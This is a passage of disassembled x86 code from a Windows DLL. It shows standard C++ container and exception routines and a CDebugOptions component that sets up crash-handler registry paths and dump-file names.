					; sub_6AF31CCD+8Dj ...
		mov	esi, ebx
		lea	eax, [ebx+4]
		jmp	loc_6AF31E09
; ---------------------------------------------------------------------------

loc_6AF31D74:				; CODE XREF: sub_6AF31CCD+142j
		mov	ecx, [eax]
		mov	edx, [ecx+4]
		mov	edx, [edx]
		cmp	ecx, edx
		jnz	short loc_6AF31DD4
		mov	edx, [ecx+4]
		mov	edx, [edx+8]
		cmp	byte ptr [edx+14h], 0
		jnz	short loc_6AF31DA5

loc_6AF31D8B:				; CODE XREF: sub_6AF31CCD+10Bj
		mov	ecx, [eax]
		mov	byte ptr [ecx+14h], 1
		mov	byte ptr [edx+14h], 1
		mov	ecx, [eax]
		mov	ecx, [ecx+4]
		mov	byte ptr [ecx+14h], 0
		mov	eax, [eax]
		mov	esi, [eax+4]
		jmp	short loc_6AF31E06
; ---------------------------------------------------------------------------

loc_6AF31DA5:				; CODE XREF: sub_6AF31CCD+BCj
		cmp	esi, [ecx+8]
		jnz	short loc_6AF31DB4
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF45809

loc_6AF31DB4:				; CODE XREF: sub_6AF31CCD+DBj
		mov	eax, [esi+4]
		mov	byte ptr [eax+14h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+14h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF316D5
		jmp	short loc_6AF31E06
; ---------------------------------------------------------------------------

loc_6AF31DD4:				; CODE XREF: sub_6AF31CCD+B0j
		cmp	byte ptr [edx+14h], 0
		jz	short loc_6AF31D8B
		cmp	esi, [ecx]
		jnz	short loc_6AF31DE8
		mov	esi, ecx
		push	esi
		mov	ecx, edi
		call	sub_6AF316D5

loc_6AF31DE8:				; CODE XREF: sub_6AF31CCD+10Fj
		mov	eax, [esi+4]
		mov	byte ptr [eax+14h], 1
		mov	eax, [esi+4]
		mov	eax, [eax+4]
		mov	byte ptr [eax+14h], 0
		mov	eax, [esi+4]
		push	dword ptr [eax+4]
		mov	ecx, edi
		call	sub_6AF45809

loc_6AF31E06:				; CODE XREF: sub_6AF31CCD+D6j
					; sub_6AF31CCD+105j
		lea	eax, [esi+4]

loc_6AF31E09:				; CODE XREF: sub_6AF31CCD+A2j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 0
		jz	loc_6AF31D74
		mov	eax, [edi+4]
		mov	eax, [eax+4]
		mov	ecx, [ebp+var_C]
		mov	byte ptr [eax+14h], 1
		mov	eax, [ebp+arg_0]
		pop	edi
		mov	[eax], ebx
		pop	esi
		pop	ebx
		mov	large fs:0, ecx
		leave
		retn	10h
sub_6AF31CCD	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF31E35	proc near		; CODE XREF: sub_6AF31E7A+7p
					; sub_6AF32123+7p
					; DATA XREF: ...

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_21 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		mov	esi, ecx
		push	edi
		mov	[ebp+var_10], esi
		call	ds:__imp_??0exception@@QAE@ABV0@@Z ; exception::exception(exception const &)
		and	[ebp+var_4], 0
		add	edi, 0Ch
		push	edi
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF54890
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV01@@Z	; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>> const &)
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		leave
		retn	4
sub_6AF31E35	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF31E7A	proc near		; DATA XREF: .rdata:6AF61E84o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	sub_6AF31E35
		mov	dword ptr [esi], offset	off_6AF54898
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF31E7A	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF31E92(int, void *)
sub_6AF31E92	proc near		; CODE XREF: sub_6AF327B1+3Bp

var_54		= dword	ptr -54h
var_2C		= byte ptr -2Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_22 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		push	ebx
		mov	ebx, [ebp+arg_4]
		cmp	byte ptr [ebx+15h], 0
		push	esi
		push	edi
		mov	[ebp+var_10], ecx
		jz	short loc_6AF31EE1
		push	offset aInvalidMapSetT ; "invalid map/set<T> iterator"
		lea	ecx, [ebp+var_2C]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_2C]
		push	eax
		lea	ecx, [ebp+var_54]
		call	sub_6AF3136A
		push	offset dword_6AF61F1C
		lea	eax, [ebp+var_54]
		push	eax
		mov	[ebp+var_54], offset off_6AF548A0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF31EE1:				; CODE XREF: sub_6AF31E92+1Aj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF31681
		mov	ecx, [ebx]
		cmp	byte ptr [ecx+15h], 0
		jz	short loc_6AF31EF6
		mov	edi, [ebx+8]
		jmp	short loc_6AF31F0D
; ---------------------------------------------------------------------------

loc_6AF31EF6:				; CODE XREF: sub_6AF31E92+5Dj
		mov	eax, [ebx+8]
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF31F03
		mov	edi, ecx
		jmp	short loc_6AF31F0D
; ---------------------------------------------------------------------------

loc_6AF31F03:				; CODE XREF: sub_6AF31E92+6Bj
		mov	eax, [ebp+arg_4]
		cmp	eax, ebx
		mov	edi, [eax+8]
		jnz	short loc_6AF31F83

loc_6AF31F0D:				; CODE XREF: sub_6AF31E92+62j
					; sub_6AF31E92+6Fj
		cmp	byte ptr [edi+15h], 0
		mov	esi, [ebx+4]
		jnz	short loc_6AF31F19
		mov	[edi+4], esi

loc_6AF31F19:				; CODE XREF: sub_6AF31E92+82j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	[eax+4], ebx
		jnz	short loc_6AF31F29
		mov	[eax+4], edi
		jmp	short loc_6AF31F34
; ---------------------------------------------------------------------------

loc_6AF31F29:				; CODE XREF: sub_6AF31E92+90j
		cmp	[esi], ebx
		jnz	short loc_6AF31F31
		mov	[esi], edi
		jmp	short loc_6AF31F34
; ---------------------------------------------------------------------------

loc_6AF31F31:				; CODE XREF: sub_6AF31E92+99j
		mov	[esi+8], edi

loc_6AF31F34:				; CODE XREF: sub_6AF31E92+95j
					; sub_6AF31E92+9Dj
		mov	ecx, [ecx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF31F57
		cmp	byte ptr [edi+15h], 0
		jz	short loc_6AF31F45
		mov	edx, esi
		jmp	short loc_6AF31F55
; ---------------------------------------------------------------------------

loc_6AF31F45:				; CODE XREF: sub_6AF31E92+ADj
		mov	eax, [edi]
		mov	edx, edi
		jmp	short loc_6AF31F4F
; ---------------------------------------------------------------------------

loc_6AF31F4B:				; CODE XREF: sub_6AF31E92+C1j
		mov	edx, eax
		mov	eax, [edx]

loc_6AF31F4F:				; CODE XREF: sub_6AF31E92+B7j
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF31F4B

loc_6AF31F55:				; CODE XREF: sub_6AF31E92+B1j
		mov	[ecx], edx

loc_6AF31F57:				; CODE XREF: sub_6AF31E92+A7j
		mov	eax, [ebp+var_10]
		mov	ecx, [eax+4]
		cmp	[ecx+8], ebx
		jnz	short loc_6AF31FDD
		cmp	byte ptr [edi+15h], 0
		jz	short loc_6AF31F6C
		mov	edx, esi
		jmp	short loc_6AF31F7E
; ---------------------------------------------------------------------------

loc_6AF31F6C:				; CODE XREF: sub_6AF31E92+D4j
		mov	eax, [edi+8]
		mov	edx, edi
		jmp	short loc_6AF31F78
; ---------------------------------------------------------------------------

loc_6AF31F73:				; CODE XREF: sub_6AF31E92+EAj
		mov	edx, eax
		mov	eax, [edx+8]

loc_6AF31F78:				; CODE XREF: sub_6AF31E92+DFj
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF31F73

loc_6AF31F7E:				; CODE XREF: sub_6AF31E92+D8j
		mov	[ecx+8], edx
		jmp	short loc_6AF31FDD
; ---------------------------------------------------------------------------

loc_6AF31F83:				; CODE XREF: sub_6AF31E92+79j
		mov	[ecx+4], eax
		mov	ecx, [ebx]
		mov	[eax], ecx
		cmp	eax, [ebx+8]
		jnz	short loc_6AF31F93
		mov	esi, eax
		jmp	short loc_6AF31FAD
; ---------------------------------------------------------------------------

loc_6AF31F93:				; CODE XREF: sub_6AF31E92+FBj
		cmp	byte ptr [edi+15h], 0
		mov	esi, [eax+4]
		jnz	short loc_6AF31F9F
		mov	[edi+4], esi

loc_6AF31F9F:				; CODE XREF: sub_6AF31E92+108j
		mov	[esi], edi
		mov	ecx, [ebx+8]
		mov	[eax+8], ecx
		mov	ecx, [ebx+8]
		mov	[ecx+4], eax

loc_6AF31FAD:				; CODE XREF: sub_6AF31E92+FFj
		mov	ecx, [ebp+var_10]
		mov	ecx, [ecx+4]
		cmp	[ecx+4], ebx
		jnz	short loc_6AF31FBD
		mov	[ecx+4], eax
		jmp	short loc_6AF31FCB
; ---------------------------------------------------------------------------

loc_6AF31FBD:				; CODE XREF: sub_6AF31E92+124j
		mov	ecx, [ebx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF31FC8
		mov	[ecx], eax
		jmp	short loc_6AF31FCB
; ---------------------------------------------------------------------------

loc_6AF31FC8:				; CODE XREF: sub_6AF31E92+130j
		mov	[ecx+8], eax

loc_6AF31FCB:				; CODE XREF: sub_6AF31E92+129j
					; sub_6AF31E92+134j
		mov	ecx, [ebx+4]
		mov	[eax+4], ecx
		mov	dl, [ebx+14h]
		mov	cl, [eax+14h]
		mov	[eax+14h], dl
		mov	[ebx+14h], cl

loc_6AF31FDD:				; CODE XREF: sub_6AF31E92+CEj
					; sub_6AF31E92+EFj
		cmp	byte ptr [ebx+14h], 1
		jnz	loc_6AF320EA
		jmp	loc_6AF3209E
; ---------------------------------------------------------------------------

loc_6AF31FEC:				; CODE XREF: sub_6AF31E92+215j
		cmp	byte ptr [edi+14h], 1
		jnz	loc_6AF320E6
		mov	eax, [esi]
		cmp	edi, eax
		jnz	short loc_6AF32068
		mov	eax, [esi+8]
		cmp	byte ptr [eax+14h], 0
		jnz	short loc_6AF32016
		mov	byte ptr [eax+14h], 1
		push	esi
		mov	byte ptr [esi+14h], 0
		call	sub_6AF45809
		mov	eax, [esi+8]

loc_6AF32016:				; CODE XREF: sub_6AF31E92+171j
		cmp	byte ptr [eax+15h], 0
		jnz	short loc_6AF32099
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF3202D
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jz	short loc_6AF32095

loc_6AF3202D:				; CODE XREF: sub_6AF31E92+190j
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF3204C
		mov	ecx, [eax]
		mov	byte ptr [ecx+14h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+14h], 0
		call	sub_6AF316D5
		mov	eax, [esi+8]

loc_6AF3204C:				; CODE XREF: sub_6AF31E92+1A2j
		mov	cl, [esi+14h]
		mov	[eax+14h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+14h], 1
		mov	eax, [eax+8]
		push	esi
		mov	byte ptr [eax+14h], 1
		call	sub_6AF45809
		jmp	short loc_6AF320E6
; ---------------------------------------------------------------------------

loc_6AF32068:				; CODE XREF: sub_6AF31E92+168j
		cmp	byte ptr [eax+14h], 0
		jnz	short loc_6AF3207E
		mov	byte ptr [eax+14h], 1
		push	esi
		mov	byte ptr [esi+14h], 0
		call	sub_6AF316D5
		mov	eax, [esi]

loc_6AF3207E:				; CODE XREF: sub_6AF31E92+1DAj
		cmp	byte ptr [eax+15h], 0
		jnz	short loc_6AF32099
		mov	ecx, [eax+8]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF320AF
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF320AF

loc_6AF32095:				; CODE XREF: sub_6AF31E92+199j
		mov	byte ptr [eax+14h], 0

loc_6AF32099:				; CODE XREF: sub_6AF31E92+188j
					; sub_6AF31E92+1F0j
		mov	edi, esi
		mov	esi, [esi+4]

loc_6AF3209E:				; CODE XREF: sub_6AF31E92+155j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	edi, [eax+4]
		jnz	loc_6AF31FEC
		jmp	short loc_6AF320E6
; ---------------------------------------------------------------------------

loc_6AF320AF:				; CODE XREF: sub_6AF31E92+1F9j
					; sub_6AF31E92+201j
		mov	ecx, [eax]
		cmp	byte ptr [ecx+14h], 1
		jnz	short loc_6AF320CD
		mov	ecx, [eax+8]
		mov	byte ptr [ecx+14h], 1
		mov	ecx, [ebp+var_10]
		push	eax
		mov	byte ptr [eax+14h], 0
		call	sub_6AF45809
		mov	eax, [esi]

loc_6AF320CD:				; CODE XREF: sub_6AF31E92+223j
		mov	cl, [esi+14h]
		mov	[eax+14h], cl
		mov	ecx, [ebp+var_10]
		mov	byte ptr [esi+14h], 1
		mov	eax, [eax]
		push	esi
		mov	byte ptr [eax+14h], 1
		call	sub_6AF316D5

loc_6AF320E6:				; CODE XREF: sub_6AF31E92+15Ej
					; sub_6AF31E92+1D4j ...
		mov	byte ptr [edi+14h], 1

loc_6AF320EA:				; CODE XREF: sub_6AF31E92+14Fj
		mov	ecx, [ebx+0Ch]
		sub	ecx, 10h
		call	sub_6AF3160D
		push	ebx		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+8]
		test	eax, eax
		pop	edi
		pop	esi
		pop	ebx
		jbe	short loc_6AF3210D
		dec	eax
		mov	[ecx+8], eax

loc_6AF3210D:				; CODE XREF: sub_6AF31E92+275j
		mov	ecx, [ebp+arg_4]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		leave
		retn	8
sub_6AF31E92	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF32123	proc near		; DATA XREF: .rdata:6AF61F08o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	sub_6AF31E35
		mov	dword ptr [esi], offset	off_6AF548A0
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF32123	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3213B	proc near		; CODE XREF: Ordinal148+12Cp
					; Ordinal184+58p ...

arg_0		= byte ptr  4

		push	esi
		push	edi
		mov	edi, ecx
		mov	eax, [edi]
		mov	cl, [eax]
		xor	esi, esi
		test	cl, cl
		jz	short loc_6AF32175

loc_6AF32149:				; CODE XREF: sub_6AF3213B+2Aj
		cmp	cl, [esp+8+arg_0]
		jnz	short loc_6AF32157
		test	esi, esi
		jnz	short loc_6AF32159
		mov	esi, eax
		jmp	short loc_6AF32159
; ---------------------------------------------------------------------------

loc_6AF32157:				; CODE XREF: sub_6AF3213B+12j
		xor	esi, esi

loc_6AF32159:				; CODE XREF: sub_6AF3213B+16j
					; sub_6AF3213B+1Aj
		push	eax		; unsigned __int8 *
		call	ds:_mbsinc
		pop	ecx
		mov	cl, [eax]
		test	cl, cl
		jnz	short loc_6AF32149
		test	esi, esi
		jz	short loc_6AF32175
		sub	esi, [edi]
		mov	ecx, edi
		push	esi
		call	sub_6AF31C8E

loc_6AF32175:				; CODE XREF: sub_6AF3213B+Cj
					; sub_6AF3213B+2Ej
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
sub_6AF3213B	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3217C(int,	char *Format, char Args)
sub_6AF3217C	proc near		; CODE XREF: Ordinal150+41p
					; Ordinal150+55p ...

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		call	sub_6AF31BF4
		retn
sub_6AF3217C	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF3218F(int,	char *Format, char Args)
sub_6AF3218F	proc near		; CODE XREF: Ordinal148+146p
					; Ordinal564+106p ...

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		call	sub_6AF31BAD
		retn
sub_6AF3218F	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF321A2	proc near		; CODE XREF: sub_6AF3260A+2Cp

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		xor	al, al
		test	edx, edx
		jz	short locret_6AF321BF
		test	edx, 0FFFF0000h
		jnz	short locret_6AF321BF
		movzx	eax, dx
		push	eax
		call	sub_6AF31CA9
		mov	al, 1

locret_6AF321BF:			; CODE XREF: sub_6AF321A2+8j
					; sub_6AF321A2+10j
		retn	4
sub_6AF321A2	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF321C2(void *)
sub_6AF321C2	proc near		; CODE XREF: sub_6AF321C2+16p
					; sub_6AF3265A+Cp

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]
		cmp	byte ptr [edi+15h], 0
		mov	ebx, ecx
		mov	esi, edi
		jnz	short loc_6AF321F5

loc_6AF321D3:				; CODE XREF: sub_6AF321C2+31j
		push	dword ptr [esi+8] ; void *
		mov	ecx, ebx
		call	sub_6AF321C2
		mov	esi, [esi]
		mov	ecx, edi
		call	sub_6AF318B3
		push	edi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		cmp	byte ptr [esi+15h], 0
		pop	ecx
		mov	edi, esi
		jz	short loc_6AF321D3

loc_6AF321F5:				; CODE XREF: sub_6AF321C2+Fj
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_6AF321C2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF321FB	proc near		; CODE XREF: sub_6AF32680+11Ep

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	eax, [edi+4]
		mov	esi, [eax+4]
		mov	ebx, eax
		mov	al, 1
		mov	byte ptr [ebp+var_8], al
		jmp	short loc_6AF32232
; ---------------------------------------------------------------------------

loc_6AF32214:				; CODE XREF: sub_6AF321FB+3Bj
		lea	eax, [esi+0Ch]
		push	eax
		push	[ebp+arg_4]
		mov	ebx, esi
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		mov	byte ptr [ebp+var_8], al
		jz	short loc_6AF3222F
		mov	esi, [esi]
		jmp	short loc_6AF32232
; ---------------------------------------------------------------------------

loc_6AF3222F:				; CODE XREF: sub_6AF321FB+2Ej
		mov	esi, [esi+8]

loc_6AF32232:				; CODE XREF: sub_6AF321FB+17j
					; sub_6AF321FB+32j
		cmp	byte ptr [esi+15h], 0
		jz	short loc_6AF32214
		test	al, al
		mov	esi, ebx
		mov	[ebp+var_4], esi
		jz	short loc_6AF32271
		mov	eax, [edi+4]
		cmp	ebx, [eax]
		jnz	short loc_6AF32266
		push	[ebp+arg_4]
		push	ebx
		push	1

loc_6AF3224E:				; CODE XREF: sub_6AF321FB+8Fj
		lea	eax, [ebp+arg_4]
		push	eax
		mov	ecx, edi
		call	sub_6AF31CCD
		mov	ecx, [eax]
		mov	eax, [ebp+arg_0]
		mov	[eax], ecx
		mov	byte ptr [eax+4], 1
		jmp	short loc_6AF32295
; ---------------------------------------------------------------------------

loc_6AF32266:				; CODE XREF: sub_6AF321FB+4Bj
		lea	ecx, [ebp+var_4]
		call	sub_6AF315CE
		mov	esi, [ebp+var_4]

loc_6AF32271:				; CODE XREF: sub_6AF321FB+44j
		push	[ebp+arg_4]
		lea	eax, [esi+0Ch]
		push	eax
		call	sub_6AF31807
		test	al, al
		pop	ecx
		pop	ecx
		jz	short loc_6AF3228C
		push	[ebp+arg_4]
		push	ebx
		push	[ebp+var_8]
		jmp	short loc_6AF3224E
; ---------------------------------------------------------------------------

loc_6AF3228C:				; CODE XREF: sub_6AF321FB+86j
		mov	eax, [ebp+arg_0]
		mov	[eax], esi
		mov	byte ptr [eax+4], 0

loc_6AF32295:				; CODE XREF: sub_6AF321FB+69j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
sub_6AF321FB	endp

; Exported entry 148.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal148
Ordinal148	proc near		; CODE XREF: Ordinal136+1Cp
					; DATA XREF: .rdata:off_6AF66098o

var_94		= byte ptr -94h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= byte ptr -48h
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		mov	eax, offset unknown_libname_23 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 88h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	ebx, ebx
		cmp	edi, ebx
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		mov	esi, ecx
		jnz	short loc_6AF322CC
		xor	eax, eax
		jmp	loc_6AF324CC
; ---------------------------------------------------------------------------

loc_6AF322CC:				; CODE XREF: Ordinal148+27j
		push	dword ptr [esi+38h]
		mov	ecx, edi
		push	2
		call	Ordinal566
		push	dword ptr [esi+3Ch]
		mov	ecx, edi
		push	2
		call	Ordinal568
		push	dword ptr [esi+40h]
		mov	ecx, edi
		call	Ordinal570
		push	dword ptr [esi+44h]
		mov	ecx, edi
		push	3
		call	Ordinal566
		push	dword ptr [esi+48h]
		mov	ecx, edi
		push	3
		call	Ordinal568
		push	dword ptr [esi+4Ch]
		mov	ecx, edi
		push	4
		call	Ordinal566
		push	dword ptr [esi+50h]
		mov	ecx, edi
		push	4
		call	Ordinal568
		push	dword ptr [esi+54h]
		mov	ecx, edi
		push	5
		call	Ordinal566
		push	dword ptr [esi+58h]
		mov	ecx, edi
		push	5
		call	Ordinal568
		push	dword ptr [esi+64h]
		mov	ecx, edi
		call	Ordinal574
		push	dword ptr [esi+68h]
		mov	ecx, edi
		call	Ordinal576
		push	dword ptr [esi+60h]
		mov	ecx, edi
		call	Ordinal578
		lea	ecx, [ebp+var_28]
		call	sub_6AF318C3
		add	esi, 5Ch
		mov	eax, [esi]
		cmp	[eax-0Ch], ebx
		mov	[ebp+var_4], ebx
		jz	loc_6AF324B3
		lea	ecx, [ebp+var_94]
		call	Ordinal1163
		push	ebx		; Args
		lea	ecx, [ebp+var_94]
		mov	byte ptr [ebp+var_4], 1
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF323A9
		push	offset aCdebugoptionsA ; "CDebugOptions::Apply() : path.SplitPath"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF32397:				; CODE XREF: Ordinal148+202j
		lea	ecx, [ebp+var_94]
		call	Ordinal1164
		xor	esi, esi
		jmp	loc_6AF324BF
; ---------------------------------------------------------------------------

loc_6AF323A9:				; CODE XREF: Ordinal148+EEj
		push	offset aCdebugoption_0 ; "CDebugOptions::Apply()"
		lea	ecx, [ebp+var_48]
		call	Ordinal751
		push	esi
		lea	ecx, [ebp+var_28]
		mov	byte ptr [ebp+var_4], 3
		call	sub_6AF31C41
		push	5Ch
		lea	ecx, [ebp+var_28]
		call	sub_6AF3213B
		lea	ecx, [ebp+var_94]
		call	Ordinal1171
		push	eax		; Args
		lea	eax, [ebp+var_28]
		push	offset aS_dmp	; "\\%s.dmp"
		push	eax		; int
		call	sub_6AF3218F
		add	esp, 0Ch
		jmp	loc_6AF3248A
; ---------------------------------------------------------------------------

loc_6AF323EF:				; DATA XREF: .rdata:6AF61F84o
		push	13h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	ecx, [ebp+var_50]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF32487
		retn
; ---------------------------------------------------------------------------

loc_6AF32432:				; DATA XREF: .rdata:6AF61F94o
		push	15h
		lea	ecx, [ebp+var_48]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_48]
		call	Ordinal762
		mov	eax, [ebp+var_4C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_48]
		call	Ordinal764
		lea	ecx, [ebp+var_48]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF32487
		retn
; ---------------------------------------------------------------------------

loc_6AF32487:				; DATA XREF: Ordinal148+190o
					; Ordinal148+1E5o
		mov	edi, [ebp+arg_0]

loc_6AF3248A:				; CODE XREF: Ordinal148+14Ej
		lea	ecx, [ebp+var_48]
		call	Ordinal753
		test	eax, eax
		lea	ecx, [ebp+var_48]
		jz	short loc_6AF324A3
		call	Ordinal752
		jmp	loc_6AF32397
; ---------------------------------------------------------------------------

loc_6AF324A3:				; CODE XREF: Ordinal148+1FBj
		call	Ordinal752
		lea	ecx, [ebp+var_94]
		call	Ordinal1164

loc_6AF324B3:				; CODE XREF: Ordinal148+CBj
		push	[ebp+var_28]	; Src
		mov	ecx, edi
		call	Ordinal572
		mov	esi, eax

loc_6AF324BF:				; CODE XREF: Ordinal148+108j
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	eax, esi

loc_6AF324CC:				; CODE XREF: Ordinal148+2Bj
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal148	endp ; sp-analysis failed

; Exported entry 150.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal150(char Args, int, int)
		public Ordinal150
Ordinal150	proc near		; CODE XREF: Ordinal147+24p
					; Ordinal144+5Ap
					; DATA XREF: ...

var_44		= byte ptr -44h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Args		= byte ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	eax, offset unknown_libname_24 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 40h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	offset aCdebugoptionsB ; "CDebugOptions::BuildRegPath()"
		lea	ecx, [ebp+var_44]
		mov	[ebp+var_14], eax
		call	Ordinal751
		and	[ebp+var_4], 0
		push	offset aCrashhandler ; "CrashHandler"
		push	dword ptr [ebp+Args] ; Args
		mov	esi, offset aSS	; "%s\\%s"
		push	esi		; Format
		push	[ebp+arg_4]	; int
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF3217C
		add	esp, 10h
		push	offset aDebugoutput ; "DebugOutput"
		push	dword ptr [ebp+Args] ; Args
		push	esi		; Format
		push	[ebp+arg_8]	; int
		call	sub_6AF3217C
		add	esp, 10h

loc_6AF32542:				; DATA XREF: sub_6AF32572+3Do
					; sub_6AF325B5+4Fo
		lea	ecx, [ebp+var_44]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_44]
		inc	esi
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal150	endp


; =============== S U B	R O U T	I N E =======================================


